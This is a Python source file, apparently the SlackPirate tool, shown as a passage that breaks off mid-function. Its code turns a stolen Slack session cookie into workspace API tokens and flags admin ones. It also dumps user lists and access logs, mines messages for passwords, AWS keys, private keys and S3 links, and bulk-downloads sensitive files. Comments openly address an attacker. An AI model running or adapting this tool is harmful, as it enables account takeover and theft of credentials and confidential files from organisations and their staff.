#!/usr/bin/env python3

import argparse
import json
import pathlib
import re
import time
import colorama
import requests
import termcolor
import queue
import urllib.parse
import csv

from datetime import datetime
from typing import List
from multiprocessing import Process, Queue
from constants import get_user_agent


#############
# Constants #
#############
POLL_TIMEOUT = 0.5  # Seconds to wait on a retrieval to finish
DOWNLOAD_BATCH_SIZE = 25  # Pull up to this many files at once
CSV_HEADERS = ['timestamp', 'link', 'channel_id', 'channel_name', 'user_id', 'user_name', 'regex_results']
# Query params
MAX_RETRIEVAL_COUNT = 900
# Output file names
FILE_USER_LIST = "user-list.json"
FILE_ACCESS_LOGS = "access-logs.json"
FILE_S3 = "S3.txt"
FILE_CREDENTIALS = "passwords.txt"
FILE_AWS_KEYS = "aws-keys.txt"
FILE_PINNED_MESSAGES = "pinned-messages.txt"
FILE_PRIVATE_KEYS = "private-keys.txt"
FILE_LINKS = "URLs.txt"

# Query pieces
S3_QUERIES = ["s3.amazonaws.com", "s3://", "https://s3", "http://s3"]
CREDENTIALS_QUERIES = ["password:", "password is", "pwd", "passwd"]
AWS_KEYS_QUERIES = ["ASIA*", "AKIA*"]
PRIVATE_KEYS_QUERIES = ["BEGIN DSA PRIVATE",
                        "BEGIN EC PRIVATE",
                        "BEGIN OPENSSH PRIVATE",
                        "BEGIN PGP PRIVATE",
                        "BEGIN RSA PRIVATE"]
INTERESTING_FILE_QUERIES = [".config",
                            ".doc",
                            ".docx",
                            ".key",
                            ".p12",
                            ".pem",
                            ".pfx",
                            ".pkcs12",
                            ".ppk",
                            ".sh",
                            ".sql",
                            "backup",
                            "password",
                            "pasted image",
                            "secret"]
LINKS_QUERIES = ["amazonaws",
                 "atlassian",
                 "beta",
                 "confluence",
                 "docs.google.com",
                 "github",
                 "internal",
                 "jenkins",
                 "jira",
                 "kubernetes",
                 "sharepoint",
                 "staging",
                 "swagger",
                 "travis",
                 "trello"]
# Regex constants with explanatory links
# https://regex101.com/r/9GRaem/2
ALREADY_SIGNED_IN_TEAM_REGEX = r"([a-zA-Z0-9\-]+\.slack\.com)"
# https://regex101.com/r/2Hz8AX/3
SLACK_API_TOKEN_REGEX = r"(xox[a-zA-Z]-[a-zA-Z0-9-]+)"
# https://regex101.com/r/cSZW0G/1
WORKSPACE_VALID_EMAILS_REGEX = r"email-domains-formatted=\"(@.+?)[\"]"
# https://regex101.com/r/jWrF8F/2
PRIVATE_KEYS_REGEX = r"([-]+BEGIN [^\s]+ PRIVATE KEY[-]+[\s]*[^-]*[-]+END [^\s]+ PRIVATE KEY[-]+)"
# https://regex101.com/r/6bLaKj/8
S3_REGEX = r"(" \
           r"[a-zA-Z0-9-\.\_]+\.s3\.amazonaws\.com" \
           r"|s3://[a-zA-Z0-9-\.\_]+" \
           r"|s3-[a-zA-Z0-9-\.\_\/]+" \
           r"|s3.amazonaws.com/[a-zA-Z0-9-\.\_]+" \
           r"|s3.console.aws.amazon.com/s3/buckets/[a-zA-Z0-9-\.\_]+)"
# https://regex101.com/r/DoPV1M/3
CREDENTIALS_REGEX = r"(?i)(" \
                    r"password\s*[`=:\"]+\s*[^\s]+|" \
                    r"password is\s*[`=:\"]*\s*[^\s]+|" \
                    r"pwd\s*[`=:\"]*\s*[^\s]+|" \
                    r"passwd\s*[`=:\"]+\s*[^\s]+)"
# https://regex101.com/r/IEq5nU/5
AWS_KEYS_REGEX = r"(?!com/archives/[A-Z0-9]{9}/p[0-9]{16})" \
                 r"((?<![A-Za-z0-9/+])[A-Za-z0-9/+]{40}(?![A-Za-z0-9/+])|(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9]))"
# https://regex101.com/r/SU43wh/1
# Top-level domain capture group
TLD_GROUP = r"(?:com|net|org|edu|gov|mil|aero|asia|biz|cat|coop|info|int" \
            r"|jobs|mobi|museum|name|post|pro|tel|travel|xxx|ac|ad|ae" \
            r"|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd" \
            r"|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc" \
            r"|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cs|cu|cv|cx|cy|cz|dd" \
            r"|de|dj|dk|dm|do|dz|ec|ee|eg|eh|er|es|et|eu|fi|fj|fk|fm" \
            r"|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt" \
            r"|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is" \
            r"|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb" \
            r"|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mm" \
            r"|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng" \
            r"|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr" \
            r"|ps|pt|pw|py|qa|re|ro|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si" \
            r"|sj|Ja|sk|sl|sm|sn|so|sr|ss|st|su|sv|sx|sy|sz|tc|td|tf" \
            r"|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|us" \
            r"|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)"
LINKS_REGEX = r"(?i)\b((?:https?:(?:/{1,3}|[a-z0-9%])|[a-z0-9.\-]+[.]" + TLD_GROUP + \
              r"/)(?:[^\s()<>{}\[\]]+|\([^\s()]*?\([^\s()]+\)[^\s()]*?\)" \
              r"|\([^\s]+?\))+(?:\([^\s()]*?\([^\s()]+\)[^\s()]*?\)" \
              r"|\([^\s]+?\)|[^\s`!()\[\]{};:'\".,<>?«»“”‘’])" \
              r"|(?:(?<!@)[a-z0-9]+(?:[.\-][a-z0-9]+)*[.]" + TLD_GROUP + r"\b/?(?!@)))"

# Data Classes


class ScanningContext:
    """
    Contains context data for performing scans and storing results.
    """

    def __init__(self, output_directory: str, slack_workspace: str, user_agent: str, user_id: str, username: str):
        self.output_directory = output_directory
        self.slack_workspace = slack_workspace
        self.user_agent = user_agent
        self.user_id = user_id
        self.username = username


# Module functionality
def sleep_if_rate_limited(slack_api_json_response):
    """
    All this function does is check if the response tells us we're being rate-limited. If it is, sleep for
    60 seconds then continue. Previously I was proactively sleeping for 60 seconds before the documented rate-limit
    kicked in but then learned not to trust the docs as they weren't trustworthy (the actual rate-limit is
    more lenient then what they have documented which is a good thing for us but meant that a proactive rate-limit
    would sleep prematurely)
    """

    if (
        slack_api_json_response['ok'] is not False
        or slack_api_json_response['error'] != 'ratelimited'
    ):
        return False
    print(termcolor.colored("[Rate-limit]: Slack API rate limit hit - sleeping for 60 seconds", "yellow"))
    time.sleep(60)
    return True


def list_cookie_tokens(cookie, user_agent):
    """
    If the --cookie flag is set then the tool connects to a Slack Workspace that you won't be a member of then RegEx
    out the Workspaces you're logged in to. It will then connect to each one of those Workspaces then RegEx out the
    api_token and return them.
    """
    workspaces = []
    try:
        cookie['d'] = urllib.parse.quote(urllib.parse.unquote(cookie['d']))
        r = requests.get("https://slackpirate-donotuse.slack.com", cookies=cookie)
        if already_signed_in_match := set(
            re.findall(ALREADY_SIGNED_IN_TEAM_REGEX, str(r.content))
        ):
            for workspace in already_signed_in_match:
                r = requests.get(f"https://{workspace}/customize/emoji", cookies=cookie)
                regex_tokens = re.findall(SLACK_API_TOKEN_REGEX, str(r.content))
                for slack_token in regex_tokens:
                    collected_scan_context = init_scanning_context(token=slack_token, user_agent=user_agent)
                    admin = check_if_admin_token(token=slack_token, scan_context=collected_scan_context)
                    workspaces.append((workspace, slack_token, admin))
    except requests.exceptions.RequestException as exception:
        workspaces = None  # differentiate between no workspaces found and an exception occurring
        print(termcolor.colored(exception, "red"))

    return workspaces


def display_cookie_tokens(cookie, user_agent):
    """
    If the --cookie flag is set then the tool connect to a Slack Workspace that you won't be a member of (like mine)
    then RegEx out the Workspaces you're logged in to. It will then connect to each one of those Workspaces then
    RegEx out the api_token and print it to stdout. Hmm, as I write this comment I wonder if it would be a good idea
    to write the tokens to a file... maybe, maybe not. Probably not ideal to commit a bunch of corporate
    tokens to long-term storage especially as they are valid pretty much forever. I'll leave as is for now...
    """

    print(termcolor.colored("[INFO]: Scanning for Workspaces using the cookie provided - this may take a while...\n", "blue"))
    if workspaces := list_cookie_tokens(cookie, user_agent):
        for workspace, slack_token, admin in workspaces:
            if admin:
                print(
                    termcolor.colored(
                        f"Workspace: {workspace} Token: {slack_token} (admin token!)",
                        "magenta",
                    )
                )
            else:
                print(
                    termcolor.colored(
                        f"Workspace: {workspace} Token: {slack_token} (not admin)",
                        "green",
                    )
                )
    else:
        print(termcolor.colored("[ERROR]: No Workspaces were found with this cookie", "red"))
    exit()


def init_scanning_context(token, user_agent: str) -> ScanningContext:
    """
    Initialize the Scanning Context which is used for all the scans.
    """

    result = None
    try:
        r = requests.post(
            "https://slack.com/api/auth.test",
            params=dict(pretty=1),
            headers={
                'Authorization': f'Bearer {token}',
                'User-Agent': user_agent,
            },
        ).json()
        if str(r['ok']) == 'True':
            result = ScanningContext(output_directory=str(r['team']) + '_' + time.strftime("%Y%m%d-%H%M%S"),
                                     slack_workspace=str(r['url']), user_agent=user_agent, user_id=str(r['user_id']), username=str(r['user']))
        else:
            print(termcolor.colored("[ERROR]: Token not valid. Slack error: " + str(r['error']), "red"))
            exit()
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(str(exception), "red"))
    return result


def check_if_admin_token(token, scan_context: ScanningContext):
    """
    Checks to see if the token provided is an admin, owner, or primary_owner.
    """

    try:
        r = requests.get("https://slack.com/api/users.info", params=dict(
            token=token, pretty=1, user=scan_context.user_id), headers={'User-Agent': scan_context.user_agent}).json()
        return r['user']['is_admin'] or r['user']['is_owner'] or r['user']['is_primary_owner']
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(str(exception), "red"))


def print_interesting_information(scan_context: ScanningContext):
    """
    I wonder how many people know that Slack advertise the @domains that can be used to register for the Workspace?
    I've seen organizations leave old/expired/stale domains in here which can then be used by attackers to gain access
    """

    try:
        r = requests.get(scan_context.slack_workspace, headers={'User-Agent': scan_context.user_agent})
        team_domains_match = re.findall(WORKSPACE_VALID_EMAILS_REGEX, str(r.content))
        for domain in team_domains_match:
            print(
                termcolor.colored(
                    f"[INFO]: The following domains can be used on this Slack Workspace: {domain}",
                    "blue",
                )
            )
            print(termcolor.colored("\n"))
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(str(exception), "red"))


def dump_team_access_logs(token, scan_context: ScanningContext):
    """
    You need the token of an elevated user (lucky you!) and the Workspace must be a paid one - i.e., not a free one
    The information here can be useful but I wouldn't fret about it - the other data is far more interesting
    """

    results = []
    print(termcolor.colored("[Access Logs]: Attempting to download Workspace access logs", "blue"))
    try:
        r = requests.get("https://slack.com/api/team.accessLogs",
                         params=dict(token=token, pretty=1, count=MAX_RETRIEVAL_COUNT),
                         headers={'User-Agent': scan_context.user_agent}).json()
        sleep_if_rate_limited(r)
        if str(r['ok']) == 'True':
            results.extend(iter(r['logins']))
            with open(f'{scan_context.output_directory}/{FILE_ACCESS_LOGS}', 'a', encoding="utf-8") as outfile:
                json.dump(results, outfile, indent=4, sort_keys=True, ensure_ascii=False)
        else:
            print(termcolor.colored(
                "[Access Logs]: Unable to dump access logs (this is normal if you don't have a privileged token on a non-free "
                "Workspace). Slack error: " + str(r['error']), "blue"))
            print(termcolor.colored("\n"))
            return
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
    print(
        termcolor.colored(
            f"[Access Logs]: Successfully dumped access logs! Filename: ./{scan_context.output_directory}/{FILE_ACCESS_LOGS}",
            "green",
        )
    )
    print(termcolor.colored("\n"))


def dump_user_list(token, scan_context: ScanningContext):
    """
    In case you're wondering (hello fellow nerd/future me), the reason for limit=900 is because what Slack says:
    `To begin pagination, specify a limit value under 1000. We recommend no more than 200 results at a time.`
    Feel free to ignore the bit about what *they* recommend :-)
    In theory, we can strip out the limit parameter completely and Slack will return the entire dataset *BUT* they say
    this: `If the collection is too large you may experience HTTP 500 errors.` and more importantly:
    `One day pagination will become required to use this method.`
    """

    print(termcolor.colored("[User List]: Attempting to download Workspace user list", "blue"))
    pagination_cursor = ''  # virtual pagination - apparently this is what the cool kids do these days :-)
    results = []
    try:
        while True:
            r = requests.get("https://slack.com/api/users.list",
                         params=dict(token=token, pretty=1, limit=1, cursor=pagination_cursor),
                         headers={'User-Agent': scan_context.user_agent}).json()
            if not sleep_if_rate_limited(r):
                break
        if str(r['ok']) == 'False':
            print(termcolor.colored("[User List]: Unable to dump the user list. Slack error: " + str(r['error']), "red"))
            print(termcolor.colored("\n"))
        else:
            pagination_cursor = r['response_metadata']['next_cursor']
            request_url = "https://slack.com/api/users.list"
            while str(r['ok']) == 'True' and pagination_cursor:
                params = dict(token=token, pretty=1, limit=MAX_RETRIEVAL_COUNT, cursor=pagination_cursor)
                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
                for value in r['members']:
                    pagination_cursor = r['response_metadata']['next_cursor']
                    results.append(value)
            with open(f'{scan_context.output_directory}/{FILE_USER_LIST}', 'a', encoding="utf-8") as outfile:
                json.dump(results, outfile, indent=4, sort_keys=True, ensure_ascii=True)
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
    print(
        termcolor.colored(
            f"[User List]: Successfully dumped user list! Filename: ./{scan_context.output_directory}/{FILE_USER_LIST}",
            "green",
        )
    )
    print(termcolor.colored("\n"))


def find_s3(token, scan_context: ScanningContext):
    print(termcolor.colored("[S3]: Attempting to find references to S3 buckets", "blue"))
    page_count_by_query = {}

    try:
        r = None
        for query in S3_QUERIES:
            while True:
                r = requests.get(
                    "https://slack.com/api/search.messages",
                    params=dict(
                        token=token, query=f'\"{query}\"', pretty=1, count=100
                    ),
                    headers={'User-Agent': scan_context.user_agent},
                ).json()
                if not sleep_if_rate_limited(r):
                    break
            page_count_by_query[query] = (r['messages']['pagination']['page_count'])

        if verbose:
            with open(f'{scan_context.output_directory}/' + FILE_S3.replace('txt','csv'), mode='a') as log_output:
                writer = csv.writer(log_output, delimiter=';', quotechar='"', quoting=csv.QUOTE_MINIMAL)
                writer.writerow(CSV_HEADERS)

        for query, page_count in page_count_by_query.items():
            page = 1
            while page <= page_count:
                sleep_if_rate_limited(r)
                params = dict(
                    token=token,
                    query=f'\"{query}\"',
                    pretty=1,
                    count=100,
                    page=str(page),
                )
                r = requests.get("https://slack.com/api/search.messages",
                                 params=params,
                                 headers={'User-Agent': scan_context.user_agent}).json()
                regex_results = re.findall(S3_REGEX, str(r))
                if verbose:
                    write_to_csv(r, S3_REGEX, FILE_S3, scan_context)
                else:
                    with open(f'{scan_context.output_directory}/{FILE_S3}', 'a', encoding="utf-8") as log_output:
                        for item in set(regex_results):
                            log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
        print(termcolor.colored("\n"))
    file_cleanup(input_file=FILE_S3, scan_context=scan_context)
    print(
        termcolor.colored(
            f"[S3]: If any S3 buckets were found, they will be here: ./{scan_context.output_directory}/{FILE_S3}",
            "green",
        )
    )
    print(termcolor.colored("\n"))


def find_credentials(token, scan_context: ScanningContext):
    print(termcolor.colored("[Credentials]: Attempting to find references to credentials", "blue"))
    page_count_by_query = {}

    try:
        r = None
        for query in CREDENTIALS_QUERIES:
            while True:
                params = dict(token=token, query=f'\"{query}\"', pretty=1, count=100)
                r = requests.get("https://slack.com/api/search.messages",
                                 params=params,
                                 headers={'User-Agent': scan_context.user_agent}).json()
                if not sleep_if_rate_limited(r):
                    break
            page_count_by_query[query] = (r['messages']['pagination']['page_count'])

        if verbose:
            with open(f'{scan_context.output_directory}/' + FILE_CREDENTIALS.replace('txt','csv'), mode='a') as log_output:
                writer = csv.writer(log_output, delimiter=';', quotechar='"', quoting=csv.QUOTE_MINIMAL)
                writer.writerow(CSV_HEADERS)

        request_url = "https://slack.com/api/search.messages"
        for query, page_count in page_count_by_query.items():
            page = 1
            while page <= page_count:
                sleep_if_rate_limited(r)
                params = dict(
                    token=token,
                    query=f'\"{query}\"',
                    pretty=1,
                    count=100,
                    page=str(page),
                )
                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
                regex_results = re.findall(CREDENTIALS_REGEX, str(r))
                if verbose:
                    write_to_csv(r, CREDENTIALS_REGEX, FILE_CREDENTIALS, scan_context)
                else:
                    with open(f'{scan_context.output_directory}/{FILE_CREDENTIALS}', 'a', encoding="utf-8") as log_output:
                        for item in set(regex_results):
                            log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
    file_cleanup(input_file=FILE_CREDENTIALS, scan_context=scan_context)
    print(
        termcolor.colored(
            f"[Credentials]: If any credentials were found, they will be here: ./{scan_context.output_directory}/{FILE_CREDENTIALS}",
            "green",
        )
    )
    print(termcolor.colored("\n"))


def find_aws_keys(token, scan_context: ScanningContext):
    print(termcolor.colored("[AWS IAM Keys]: Attempting to find references to AWS keys", "blue"))
    page_count_by_query = {}

    try:
        r = None
        for query in AWS_KEYS_QUERIES:
            while True:
                params = dict(token=token, query=query, pretty=1, count=100)
                r = requests.get("https://slack.com/api/search.messages",
                             params=params,
                             headers={'User-Agent': scan_context.user_agent}).json()
                if not sleep_if_rate_limited(r):
                    break
            page_count_by_query[query] = (r['messages']['pagination']['page_count'])

        if verbose:
            with open(f'{scan_context.output_directory}/' + FILE_AWS_KEYS.replace('txt','csv'), mode='a') as log_output:
                writer = csv.writer(log_output, delimiter=';', quotechar='"', quoting=csv.QUOTE_MINIMAL)
                writer.writerow(CSV_HEADERS)

        request_url = "https://slack.com/api/search.messages"
        for query, page_count in page_count_by_query.items():
            page = 1
            while page <= page_count:
                sleep_if_rate_limited(r)
                params = dict(token=token, query=query, pretty=1, count=100, page=str(page))
                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
                regex_results = re.findall(AWS_KEYS_REGEX, str(r))
                if verbose:
                    write_to_csv(r, AWS_KEYS_REGEX, FILE_AWS_KEYS, scan_context)
                else:
                    with open(f'{scan_context.output_directory}/{FILE_AWS_KEYS}', 'a', encoding="utf-8") as log_output:
                        for item in set(regex_results):
                            log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
    file_cleanup(input_file=FILE_AWS_KEYS, scan_context=scan_context)
    print(
        termcolor.colored(
            f"[AWS IAM Keys]: If any AWS keys were found, they will be here: ./{scan_context.output_directory}/{FILE_AWS_KEYS}",
            "green",
        )
    )
    print(termcolor.colored("\n"))


def find_private_keys(token, scan_context: ScanningContext):
    """
    Searching for private keys by using certain keywords. Slack returns the actual string '\n' in the response so
    we're replacing the string with an actual \n new line :-)
    """

    print(termcolor.colored("[Private Keys]: Attempting to find references to private keys", "blue"))
    page_count_by_query = {}

    try:
        r = None
        for query in PRIVATE_KEYS_QUERIES:
            while True:
                params = dict(token=token, query=f'\"{query}\"', pretty=1, count=100)
                r = requests.get("https://slack.com/api/search.messages",
                             params=params,
                             headers={'User-Agent': scan_context.user_agent}).json()
                if not sleep_if_rate_limited(r):
                    break
            page_count_by_query[query] = (r['messages']['pagination']['page_count'])

        if verbose:
            with open(f'{scan_context.output_directory}/' + FILE_PRIVATE_KEYS.replace('txt','csv'), mode='a') as log_output:
                writer = csv.writer(log_output, delimiter=';', quotechar='"', quoting=csv.QUOTE_MINIMAL)
                writer.writerow(CSV_HEADERS)

        request_url = "https://slack.com/api/search.messages"
        for query, page_count in page_count_by_query.items():
            page = 1
            while page <= page_count:
                sleep_if_rate_limited(r)
                params = dict(
                    token=token,
                    query=f'\"{query}\"',
                    pretty=1,
                    count=100,
                    page=str(page),
                )
                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
                regex_results = re.findall(PRIVATE_KEYS_REGEX, str(r))
                remove_new_line_char = [w.replace('\\n', '\n') for w in regex_results]
                if verbose:
                    write_to_csv(r, PRIVATE_KEYS_REGEX, FILE_PRIVATE_KEYS, scan_context)
                else:
                    with open(f'{scan_context.output_directory}/{FILE_PRIVATE_KEYS}', 'a', encoding="utf-8") as log_output:
                        for item in set(remove_new_line_char):
                            log_output.write(item + "\n\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))

    print(
        termcolor.colored(
            f"[Private Keys]: If any private keys were found, they will be here: ./{scan_context.output_directory}/{FILE_PRIVATE_KEYS}",
            "green",
        )
    )
    print(termcolor.colored("\n"))


def find_all_channels(token, scan_context: ScanningContext):
    """
    Return a dictionary of the names and ids of all Slack channels that the token has access to.
    This includes public and private channels.
    """

    channel_list = {}
    pagination_cursor = ''
    try:
        while True:
            r = requests.get("https://slack.com/api/conversations.list",
                             params=dict(token=token,
                                         pretty=1, limit=1, cursor=pagination_cursor,
                                         types='public_channel,private_channel'),
                             headers={'User-Agent': scan_context.user_agent}).json()
            if not sleep_if_rate_limited(r):
                pagination_cursor = r['response_metadata']['next_cursor']
                break
        while str(r['ok']) and pagination_cursor:
            r = requests.get("https://slack.com/api/conversations.list",
                             params=dict(token=token,
                                         pretty=1, limit=MAX_RETRIEVAL_COUNT, cursor=pagination_cursor,
                                         types='public_channel,private_channel'),
                             headers={'User-Agent': scan_context.user_agent}).json()
            pagination_cursor = r['response_metadata']['next_cursor']
            for channel in r['channels']:
                # Add the channel name as the key and id as the value in the dictionary.
                channel_list[channel['name']] = channel['id']
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(str(exception), "red"))
    return channel_list


def write_to_csv(response, regex, file, scan_context: ScanningContext):
    for match in response['messages']['matches']:
        ts = datetime.utcfromtimestamp(int(match['ts'].split('.')[0])).strftime('%Y-%m-%d %H:%M:%S')
        link = match['permalink']
        channel_id = match['channel']['id']
        channel_name = match['channel']['name']
        user_id = match['user']
        user_name = match['username']
        match.pop('permalink', None)
        regex_results = set(re.findall(regex, str(match)))
        with open(f'{scan_context.output_directory}/' + file.replace('txt','csv'), mode='a') as log_output:
            writer = csv.writer(log_output, delimiter=';', quotechar='"', quoting=csv.QUOTE_MINIMAL)
            writer.writerow([ts, link, channel_id, channel_name, user_id, user_name, regex_results])


def _write_messages(file_path: str, contents: List[str]):
    """Helper function to write message content to the specified file"""
    if contents:
        print(
            termcolor.colored(
                f"[Pinned Messages]: Writing {len(contents)} pinned messages",
                "blue",
            )
        )
        with open(file_path, 'a', encoding="utf-8") as out:
            for text_content in contents:
                out.write(text_content)


def find_pinned_messages(token, scan_context: ScanningContext):
    """
    This function looks for pinned messages across all Slack channels the token has access to - including private
    channels. We often find interesting information in pinned messages.
    The function first calls the conversations.list API to grab all Slack channels from the Workspace. It then passes
    the channel_id to pins.list which will either return pinned messages or not. If it does, dump to file :-)
    """

    print(termcolor.colored("[Pinned Messages]: Attempting to find references to pinned messages", "blue"))
    channel_list = find_all_channels(token, scan_context)
    output_file = f"{scan_context.output_directory}/{FILE_PINNED_MESSAGES}"

    total_pinned_messages = 0
    pinned_message_contents = []
    request_header = {'User-Agent': scan_context.user_agent}

    try:
        for channel_name, channel_id in channel_list.items():
            while True:
                params = dict(token=token, pretty=1, channel=channel_id)
                r = requests.get("https://slack.com/api/pins.list", params=params, headers=request_header).json()
                if sleep_if_rate_limited(r):
                    # Write what's been accumulated so far
                    _write_messages(file_path=output_file, contents=pinned_message_contents)
                    # Clear the accumulator
                    pinned_message_contents = []
                    continue

                channel_pinned_messages = [
                    "Channel [{}]: {}\n".format(
                        channel_name, m.get('message', {}).get('text')
                    )
                    for m in r.get('items', [])
                    if m.get('type') == 'message'
                ]
                pinned_message_contents += channel_pinned_messages
                total_pinned_messages += len(channel_pinned_messages)
                break
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))

    if total_pinned_messages > 0:
        _write_messages(file_path=output_file, contents=pinned_message_contents)
        print(
            termcolor.colored(
                f"[Pinned Messages]: Wrote {total_pinned_messages} pinned messages to: ./{output_file}",
                "green",
            )
        )
    else:
        print(termcolor.colored("[Pinned Messages]: No pinned messages were found.", "green"))
    print(termcolor.colored("\n"))


def find_interesting_links(token, scan_context: ScanningContext):
    """
    Does a search for URI/URLs by searching for keywords such as 'amazonaws', 'jenkins', etc.
    We're using the special Slack search 'has:link' here.
    """

    print(termcolor.colored("[Interesting URLs]: Attempting to find references to interesting URLs", "blue"))
    page_count_by_query = {}

    try:
        r = None
        for query in LINKS_QUERIES:
            request_url = "https://slack.com/api/search.messages"
            while True:
                params = dict(token=token, query=f"has:link {query}", pretty=1, count=100)
                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
                if not sleep_if_rate_limited(r):
                    break
            page_count_by_query[query] = (r['messages']['pagination']['page_count'])

        if verbose:
            with open(f'{scan_context.output_directory}/' + FILE_LINKS.replace('txt','csv'), mode='a') as log_output:
                writer = csv.writer(log_output, delimiter=';', quotechar='"', quoting=csv.QUOTE_MINIMAL)
                writer.writerow(CSV_HEADERS)

        request_url = "https://slack.com/api/search.messages"
        for query, page_count in page_count_by_query.items():
            page = 1
            while page <= page_count:
                sleep_if_rate_limited(r)
                params = dict(
                    token=token,
                    query=f"has:link {query}",
                    pretty=1,
                    count=100,
                    page=str(page),
                )
                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
                regex_results = re.findall(LINKS_REGEX, str(r))
                if verbose:
                    write_to_csv(r, LINKS_REGEX, FILE_LINKS, scan_context)
                else:
                    with open(f'{scan_context.output_directory}/{FILE_LINKS}', 'a', encoding="utf-8") as log_output:
                        for item in set(regex_results):
                            log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
    file_cleanup(input_file=FILE_LINKS, scan_context=scan_context)
    print(
        termcolor.colored(
            f"[Interesting URLs]: If any URLs were found, they will be here: ./{scan_context.output_directory}/{FILE_LINKS}",
            "green",
        )
    )
    print(termcolor.colored("\n"))


def _retrieve_file_batch(file_requests: List[Process], completed_file_names: Queue):
    for request in file_requests:
        request.start()
    # Wait for all requests to complete
    requests_incomplete = len(file_requests) > 0
    while requests_incomplete:
        try:
            response_message = completed_file_names.get(timeout=POLL_TIMEOUT)
            print(response_message)
        except queue.Empty:
            # This is expected if nothing completed since the last check
            pass
        requests_incomplete = any(request for request in file_requests if request.is_alive())


def _download_file(url: str, output_filename: str, token: str, user_agent: str, download_directory: str, q: Queue):
    """Private helper to retrieve and write a file from a URL"""
    try:
        headers = {'Authorization': f'Bearer {token}', 'User-Agent': user_agent}
        response = requests.get(url, headers=headers)

        with open(f"{download_directory}/{output_filename}", 'wb') as output_file:
            output_file.write(response.content)
        completion_message = (
            f"[Interesting Files] Successfully downloaded {output_filename}"
        )
        q.put(termcolor.colored(completion_message, "green"))
    except requests.exceptions.RequestException as ex:
        error_msg = f"Problem downloading [{output_filename}] from [{url}]: {ex}"
        q.put(termcolor.colored(error_msg, "red"))


def download_interesting_files(token, scan_context: ScanningContext):
    """
    Downloads files which may be interesting to an attacker. Searches for certain keywords then downloads.
    """

    print(termcolor.colored("[Interesting Files]: Attempting to locate and download interesting files (this may take some time)",
                            "blue"))
    download_directory = f'{scan_context.output_directory}/downloads'
    pathlib.Path(download_directory).mkdir(parents=True, exist_ok=True)

    completed_file_names = Queue()
    file_requests = []
    unique_file_id = set()

    # strips out characters which, though accepted in Slack, aren't accepted in Windows
    bad_chars_re = re.compile('[/:*?"<>|\\\]')  # Windows doesn't like "/ \ : * ? < > " or |
    page_counts_by_query = {}
    common_file_dl_params = (token, scan_context.user_agent, download_directory, completed_file_names)
    try:
        query_header = {'User-Agent': scan_context.user_agent}
        for query in INTERESTING_FILE_QUERIES:
            request_url = "https://slack.com/api/search.files"
            while True:
                params = dict(token=token, query=f'\"{query}\"', pretty=1, count=100)
                response_json = requests.get(request_url, params=params, headers=query_header).json()
                if not sleep_if_rate_limited(response_json):
                    break
            page_counts_by_query[query] = response_json['files']['pagination']['page_count']

        request_url = "https://slack.com/api/search.files"
        for query, page_count in page_counts_by_query.items():
            page = 1
            while page <= page_count:
                params = dict(
                    token=token,
                    query=f'\"{query}\"',
                    pretty=1,
                    count=100,
                    page=str(page),
                )
                response_json = requests.get(request_url, params=params, headers=query_header).json()
                if not sleep_if_rate_limited(response_json):
                    new_files = [new_file for new_file in response_json['files']['matches'] if
                                new_file['id'] not in unique_file_id]
                    for new_file in new_files:
                        unique_file_id.add(new_file['id'])
                        file_name = new_file['id'] + "-" + new_file['name']
                        safe_filename = bad_chars_re.sub('_', file_name)  # use underscores to replace tricky characters
                        file_dl_args = (new_file['url_private'], safe_filename) + common_file_dl_params
                        file_requests.append(Process(target=_download_file, args=file_dl_args))
                    page += 1
        # Now actually start the requests
        if file_requests:
            print(
                termcolor.colored(
                    f"[Interesting Files]: Retrieving {len(file_requests)} files...",
                    "blue",
                )
            )
            file_batches = (file_requests[i:i+DOWNLOAD_BATCH_SIZE]
                            for i in range(0, len(file_requests), DOWNLOAD_BATCH_SIZE))
            for batch in file_batches:
                _retrieve_file_batch(batch, completed_file_names)

        while not completed_file_names.empty():  # Print out any final results
            print(termcolor.colored(completed_file_names.get_nowait(), "green"))

    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))

    if file_requests:
        print(
            termcolor.colored(
                f"[Interesting Files]: Downloaded {len(file_requests)} files to: ./{scan_context.output_directory}/downloads",
                "green",
            )
        )
    else:
